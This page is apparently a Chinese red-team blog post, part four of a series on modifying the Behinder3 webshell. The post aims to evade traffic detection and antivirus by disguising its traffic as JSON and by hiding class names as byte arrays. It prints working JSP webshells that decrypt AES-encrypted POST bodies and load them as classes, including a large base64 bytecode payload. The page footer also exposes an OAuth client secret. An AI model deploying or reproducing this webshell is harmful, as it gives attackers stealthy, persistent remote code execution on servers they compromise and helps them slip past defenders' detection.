@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                红队开发: Behinder3-Beta11 实战下的二次开发 （4）
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2023-11-21</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">5.3
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1069</a></span>
+                                        
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="0x00-实战问题">0x00 实战问题</h2>
+<ul>
+<li>猜测微步流量检测的实现原理</li>
+</ul>
+<figure data-type="image" tabindex="1"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141250545.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141250545.png" alt="img" loading="lazy"></a></figure>
+<h3 id="需要解决的问题">需要解决的问题：</h3>
+<ol>
+<li>请求体的数据传递方式 需要对webshell进行修改，为适配不做修改 （未实现）</li>
+</ol>
+<p><em><strong>*原*</strong></em>：AES+Base64</p>
+<p><em><strong>*改*</strong></em>：AES+Base64 嵌入到 正常 的数据包中，伪造数据包</p>
+<ol>
+<li>返回体的数据传输方式</li>
+</ol>
+<p><em><strong>*原*</strong></em>：AES</p>
+<p><em><strong>*改*</strong></em>：AES+Base64+拼接字符串头 潜入到正常数据包中，伪造json数据包</p>
+<ol>
+<li>避免数据包格式单一，被安全设备捕捉特征</li>
+</ol>
+<h2 id="0x02-数据传输">0x02 数据传输</h2>
+<ul>
+<li>请求参数：参数传递修改为伪造Json格式 （未实现，需要修改webshell，现有所有工具都为原版）</li>
+</ul>
+<pre><code class="language-java">{Encoded: &quot;asdasdasdas&quot;}
+
+复制代码
+</code></pre>
+<ul>
+<li>返回包参数：接受参数时，伪造为加密json</li>
+</ul>
+<pre><code class="language-java">{ Result: &quot;daddasdadasda&quot; }
+
+复制代码
+</code></pre>
+<h2 id="0x02-代码实现">0x02 代码实现</h2>
+<p>原版返回数据为AES加密数据流，未进行Base64，我们构造成base64+随机数据</p>
+<figure data-type="image" tabindex="2"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251422.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251422.png" alt="img" loading="lazy"></a></figure>
+<p>数据解码时增加解码步骤：</p>
+<figure data-type="image" tabindex="3"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251361.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251361.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>客户端数据包处理过程</li>
+</ul>
+<figure data-type="image" tabindex="4"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251680.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251680.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>修改功能函数，返回数据类型，所有都要修改</li>
+</ul>
+<figure data-type="image" tabindex="5"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251375.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251375.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>修改Utils取数据时的方法，客户端只取我们需要的数据, 测试发现有些容器有些问题，修改为通用方式</li>
+</ul>
+<figure data-type="image" tabindex="6"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251314.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251314.png" alt="img" loading="lazy"></a></figure>
+<figure data-type="image" tabindex="7"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251853.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251853.png" alt="img" loading="lazy"></a></figure>
+<h2 id="0x03-静态查杀绕过">0x03 静态查杀绕过</h2>
+<ul>
+<li>通过不断注释原版webshell代码，定位到主要原因为base64解码和数据包加解密关键字/do.final问题</li>
+</ul>
+<p>通过反射重新实现加密逻辑，将关键字通过byte[]进行绕过，所有关键字通过反射加载实现</p>
+<p>base通过反射+byte[] 兼容各版本jdk，避免高低版本解码问题</p>
+<pre><code class="language-java">&lt;%!class U extends ClassLoader{U(ClassLoader c)
+{super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}
+    public static byte[] s(String bs) throws Exception {
+        byte[] value = null;
+        Class a;
+        try {
+            a = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 66, 97, 115, 101, 54, 52}));
+            Object b = a.getMethod(new String(new byte[]{103, 101, 116, 68, 101, 99, 111, 100, 101, 114}), (Class[])null).invoke(a, (Object[])null);
+            value = (byte[]) b.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101}), String.class).invoke(b, bs);
+        } catch (Exception var6) {
+            try {
+                a = Class.forName(new String(new byte[]{}));
+                Object c = a.newInstance();
+                value = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114}), String.class).invoke(c, bs);
+            } catch (Exception var5) {
+            }
+      }
+        return value;
+    }
+%&gt;
+&lt;%if (request.getMethod().equals(&quot;POST&quot;))
+    {
+        String json =&quot;e45e329feb5d925b&quot;;
+        session.putValue(&quot;u&quot;,json);
+        String xo = new String(new byte[]{106, 97, 118, 97, 120, 46, 99, 114, 121, 112, 116, 111, 46, 67, 105, 112, 104, 101, 114});
+        Class ci = Class.forName(xo);
+        java.lang.reflect.Method g = ci.getMethod(new String(new byte[]{103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101}), String.class);
+        Object c = ci.cast(g.invoke((null),new String(new byte[]{65, 69, 83})));
+        ci.getMethod(new String(new byte[]{105, 110, 105, 116}),int.class,java.security.Key.class).invoke(c,2,new javax.crypto.spec.SecretKeySpec(json.getBytes(),new String(new byte[]{65, 69, 83})));
+        try {
+            String ok = request.getReader().readLine();
+            byte [] x = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 111, 70, 105, 110, 97, 108}),byte[].class).invoke(c,s(ok));
+            ClassLoader sb = this.getClass().getClassLoader();
+            new U(sb).g(x).newInstance().equals(pageContext);
+        } catch (Exception e) {
+            out.print(e.toString());
+        }
+    }
+%&gt;
+</code></pre>
+<ul>
+<li>实战环境原版jsp编译为class时，存在各种问题，我们通过类加载definclass的方式对webshell逻辑进行修改</li>
+</ul>
+<p>通过javassist进行生成字节码，后续直接反射调用即可</p>
+<ul>
+<li>webshell逻辑不变</li>
+</ul>
+<figure data-type="image" tabindex="8"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251610.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251610.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>javassist生成字节码base64</li>
+</ul>
+<figure data-type="image" tabindex="9"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251852.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251852.png" alt="img" loading="lazy"></a></figure>
+<ul>
+<li>jsp实现逻辑：</li>
+</ul>
+<figure data-type="image" tabindex="10"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251049.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251049.png" alt="img" loading="lazy"></a></figure>
+<pre><code class="language-java">&lt;%@page import=&quot;java.util.*&quot;%&gt;
+
+&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}
+
+    public Class g(byte []b){return super.defineClass(b,0,b.length);}}
+
+    public static byte[] s(String bs) throws Exception {
+
+        byte[] value = null;
+
+        Class a;
+
+        try {
+
+            a = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 66, 97, 115, 101, 54, 52}));
+
+            Object b = a.getMethod(new String(new byte[]{103, 101, 116, 68, 101, 99, 111, 100, 101, 114}), (Class[])null).invoke(a, (Object[])null);
+
+            value = (byte[]) b.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101}), String.class).invoke(b, bs);
+
+        } catch (Exception var6) {
+
+            try {
+
+                a = Class.forName(new String(new byte[]{}));
+
+                Object c = a.newInstance();
+
+                value = (byte[]) c.getClass().getMethod(new String(new byte[]{100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114}), String.class).invoke(c, bs);
+
+            } catch (Exception var5) {
+
+            }
+
+        }
+
+        return value;
+
+    }
+
+%&gt;
+
+&lt;%if (request.getMethod().equals(&quot;POST&quot;)){
+
+    String data =&quot;yv66vgAAADQAhAcASwoAAQBMCgAJAE0HAE4KAAkATwcAUAoAUQBSCgAKAFMHAFQHAFUHAC8HAFYKAAkAVwoAGwBYCgAbAFkKABsAWgcAWwoAEQBcCABdCgBeAF8HAGAKAAEAYQoAFQBiCgBeAGMKABoAZAcAZQcAZgoAGgBYCgBeAGcKABoAaAoACgBpAQABcwEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABYgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWEBABFMamF2YS9sYW5nL0NsYXNzOwEAAWMBAAR2YXI2AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACYnMBABJMamF2YS9sYW5nL1N0cmluZzsBAAV2YWx1ZQEAAltCAQANU3RhY2tNYXBUYWJsZQcASwcAVgEACkV4Y2VwdGlvbnMBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABHRoaXMBAAhMY29uZmlnOwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQADKClWAQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAnR0AQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQABawEAAXABAAtwYWdlQ29udGV4dAEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAAXgBAAFlAQADb2JqAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAKU291cmNlRmlsZQEAC2NvbmZpZy5qYXZhAQAQamF2YS9sYW5nL1N0cmluZwwANABqDABrAGwBABJbTGphdmEvbGFuZy9DbGFzczsMAG0AbgEAE1tMamF2YS9sYW5nL09iamVjdDsHAG8MAHAAcQwAcgBzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAHQAdQwANAA1DAA0ADkMAHYAdwEAE2phdmEvdXRpbC9BcnJheUxpc3QMAHgAeQEAA0FFUwcAegwAewB8AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAfQB+DAA0AH8MAIAAgQwAIAAhAQAGY29uZmlnAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDACCAIMMADoAOwwAPAA9AQAFKFtCKVYBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAA2dldAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCACEAGgAbAAAAAAAFAAkAIAAhAAIAIgAAAmsABwAFAAABmgFMuwABWRAQvAhZAxBqVFkEEGFUWQUQdlRZBhBhVFkHEC5UWQgQdVRZEAYQdFRZEAcQaVRZEAgQbFRZEAkQLlRZEAoQQlRZEAsQYVRZEAwQc1RZEA0QZVRZEA4QNlRZEA8QNFS3AAK4AANNLLsAAVkQCrwIWQMQZ1RZBBBlVFkFEHRUWQYQRFRZBxBlVFkIEGNUWRAGEG9UWRAHEGRUWRAIEGVUWRAJEHJUtwACAcAABLYABSwBwAAGtgAHTi22AAi7AAFZEAa8CFkDEGRUWQQQZVRZBRBjVFkGEG9UWQcQZFRZCBBlVLcAAgS9AAlZAxIBU7YABS0EvQAKWQMqU7YAB8AAC8AAC0ynAI9OuwABWQO8CLcAArgAA00stgANOgQZBLYACLsAAVkQDLwIWQMQZFRZBBBlVFkFEGNUWQYQb1RZBxBkVFkIEGVUWRAGEEJUWRAHEHVUWRAIEGZUWRAJEGZUWRAKEGVUWRALEHJUtwACBL0ACVkDEgFTtgAFGQQEvQAKWQMqU7YAB8AAC8AAC0ynAAU6BCuwAAIAAgEJAQwADAENAZMBlgAMAAMAIwAAADIADAAAAAgAAgALAGsADAC9AA0BCQAVAQwADgENABABGwARASEAEgGTABQBlgATAZgAFgAkAAAASAAHAL0ATAAlACYAAwBrAKEAJwAoAAIBIQByACkAJgAEARsAewAnACgAAgENAIsAKgArAAMAAAGaACwALQAAAAIBmAAuAC8AAQAwAAAAKQAD/wEMAAIHADEHAAsAAQcAMv8AiQAEBwAxBwALAAcAMgABBwAy+QABADMAAAAEAAEADAABADQANQABACIAAAA6AAIAAgAAAAYqK7cADrEAAAACACMAAAAGAAEAAAAYACQAAAAWAAIAAAAGADYANwAAAAAABgApADgAAQABADQAOQABACIAAAAvAAEAAQAAAAUqtwAPsQAAAAIAIwAAAAYAAQAAABkAJAAAAAwAAQAAAAUANgA3AAAAAQA6ADsAAQAiAAAAPQAEAAIAAAAJKisDK763ABCwAAAAAgAjAAAABgABAAAAGwAkAAAAFgACAAAACQA2ADcAAAAAAAkAJQAvAAEAAQA8AD0AAQAiAAABPAAGAAgAAABtK8AAEU0sA7YAEsAAAU4sBLYAEsAAAToELAW2ABI6BRITuAAUOgYZBgW7ABVZLbYAFhITtwAXtgAYGQS4ABk6B7sAGlksBrYAEsAAG7cAHBkGGQe2AB22AB62AA0sBbYAErYAH1enAAZNA6wErAABAAAAZQBoAAwABAAjAAAAMgAMAAAAIAAFACEADgAiABgAIwAfACQAJgAlADkAJgBAACcAZQAqAGgAKABpACkAawArACQAAABcAAkABQBgAD4APwACAA4AVwBAAC0AAwAYAE0AQQAtAAQAHwBGAEIAJgAFACYAPwApAEMABgBAACUARAAvAAcAaQACAEUAKwACAAAAbQA2ADcAAAAAAG0ARgAmAAEARwAAAAwAAQAFAGAAPgBIAAIAMAAAAAkAAvcAaAcAMgIAAQBJAAAAAgBK&quot;;
+
+    String k =&quot;e45e329feb5d925b&quot;;
+
+    session.putValue(&quot;u&quot;,k);
+
+    String p=request.getReader().readLine();
+
+    ArrayList&lt;Object&gt; t = new ArrayList&lt;Object&gt;();
+
+    t.add(k); // 传入解密的key
+
+    t.add(p); // 传入请求数据包
+
+    t.add(pageContext); // 传入pageContext对象
+
+    t.add(this.getClass().getClassLoader()); // 对应的classLoader
+
+    new U(this.getClass().getClassLoader()).g(s(data)).newInstance().equals(t);}
+
+    //out.print(&quot;It Works!&quot;);
+
+%&gt;
+</code></pre>
+<h2 id="0x04-实现效果">0x04 实现效果</h2>
+<ul>
+<li>返回包实现效果：</li>
+</ul>
+<figure data-type="image" tabindex="11"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251439.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141251439.png" alt="img" loading="lazy"></a></figure>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/&sharesource=qzone&title=红队开发: Behinder3-Beta11 实战下的二次开发 （4）&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/behinder3-beta11-shi-zhan-xia-de-er-ci-kai-fa/&sharesource=weibo&title=红队开发: Behinder3-Beta11 实战下的二次开发 （4） + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/2EzGQuE0b/">
+                                                                                            云安全: 云安全自建靶场答题记录
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/-rcF0EfVN/">
+                                                                                                    ShiroAttack2：内存马-SUO5正向代理
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
